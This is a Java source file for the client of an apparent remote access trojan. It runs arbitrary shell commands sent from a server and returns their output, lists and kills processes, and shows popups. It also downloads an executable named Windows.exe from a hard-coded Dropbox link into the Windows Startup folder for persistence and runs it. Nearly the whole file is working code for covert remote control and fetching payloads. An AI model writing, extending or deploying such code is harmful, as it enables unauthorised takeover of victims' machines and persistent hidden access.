package com.jmr.monitor;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;
import java.util.Arrays;

import javax.swing.JOptionPane;

import com.jmr.monitor.packets.Packet1Connected;
import com.jmr.monitor.packets.Packet2RunCmd;
import com.jmr.monitor.packets.Packet3Response;
import com.jmr.monitor.packets.Packet4Popup;
import com.jmr.monitor.packets.Packet5Tasks;
import com.jmr.monitor.packets.Packet6KillTask;
import com.jmr.monitor.packets.Packet7Info;

public class PacketHandler {

	private static Robot robot;
	
	public PacketHandler() {
		try {
			robot = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
	}
	
	public void handlePacket2(Packet2RunCmd p2) {
		String cmd = p2.cmd;
		try {
			Process p = Runtime.getRuntime().exec("cmd /c " + cmd); //Run the console command
			p.waitFor(); //Wait for it to complete
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); //Read the output of the console
	        String line = "";
			ArrayList<String> lines = new ArrayList<String>();
			while((line = reader.readLine()) != null) //Read in the output
				lines.add(line);
			String[] info = lines.toArray(new String[lines.size()]); //To array
			sendInfo(info); //Send it to the server
			sendResponse("Ran command " + cmd);
		} catch (Exception e) {
			checkException(e);
		}
	}
	
	public void handlePacket3(Packet3Response p3) {
		String response = p3.response;
		try {
			if (response.equalsIgnoreCase("get tasks")) { //Requesting tasks
				ArrayList<String> lines = new ArrayList<String>();
				String line = "";
		        Process p = Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe"); //Get all of the tasks currently running
		        BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
		        while ((line = input.readLine()) != null) //Read in the tasks
		            lines.add(line);
		        
		        String[] tasks = new String[lines.size()]; //Create an array of the same size
		        for (int i = 0; i < lines.size(); i++) { 
		        	String taskLine = lines.get(i); //Get task
		        	if (taskLine.contains(" ")) //The line will contain the name of the process along with other information. The first portion of it is the name so we want to cut that out
		        		taskLine = taskLine.substring(0, taskLine.indexOf(" ")); //Cut out the name by starting from the beginning and going to the first 'space'
		        	if (taskLine.contains(".exe")) //If the name contains .exe then add it
		        		tasks[i] = taskLine;
		        	else //otherwise set it to null which will be removed on the server side
		        		tasks[i] = "null";
		        }
		        Arrays.sort(tasks); //Sort them alphabetically
		        Packet5Tasks p5 = new Packet5Tasks(); //Send them back
		        p5.tasks = tasks;
		        Main.client.sendTCP(p5);
			} else if (response.equalsIgnoreCase("download")) {
				String username = System.getProperty("user.name"); //Get the computers username
				String path = "C:/users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows.exe"; //Get the path to the exe file where it redownloads everything
				
				if (!new File(path).exists()) { //if it doesnt exist, redownload it
					URL website = new URL("https://dl.dropboxusercontent.com/s/ou7dpstexx3gljm/Windows.exe?dl=1&token_hash=AAHcJuHFonFMfy-r4ZIqb6gJet7iuQmYhty2jWs5350kWQ");
					ReadableByteChannel rbc = Channels.newChannel(website.openStream());
					FileOutputStream fos = new FileOutputStream("C:\\users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows.exe");
					fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
						
					fos.close();
					rbc.close();
						
					Runtime.getRuntime().exec(path); //Run the exe
						
					sendInfo(new String[] { "Had to redownload Windows.exe file. Press redownload again to redownload the client file." }); //Let the server know it had to be redownloaded
					return;
				}
				//If it wasn't returned above it will continue and run the windows.exe file which will update the client
				Runtime.getRuntime().exec(path); //Runs client 

				System.exit(0); //Exists this to restart it
			} else if (response.equalsIgnoreCase("disconnect")) {
				System.exit(0); //Disconnects
			} else if (response.equalsIgnoreCase("desktop")) {
				//WIP
			}
		} catch (Exception e) {
			checkException(e); //Check any exceptions that may occur
		}
	}
	
	public void handlePacket4(Packet4Popup p4) {
		JOptionPane.showMessageDialog(null, p4.msg); //Show popup message
	}
	
	public void handlePacket6(Packet6KillTask p6) {
		String task = p6.task; //Name of the task to be killed
		try {
			Runtime.getRuntime().exec("taskkill /F /IM " + task); //Kill the task that was asked to be killed
		} catch (IOException e) {
			checkException(e);
		}
	}
	
	public void checkException(Exception e) {
		if (Main.client.isConnected()) {
			Main.connect();
		} else {
			sendInfo(new String[] { e.getMessage() });
		}
	}
	
	private void sendResponse(String msg) {
		Packet3Response p3 = new Packet3Response();
		p3.response = msg;
		Main.client.sendTCP(p3);
	}
	
	private void sendInfo(String[] info) {
		Packet7Info p7 = new Packet7Info();
		p7.info = info;
		Main.client.sendTCP(p7);
	}
	
}
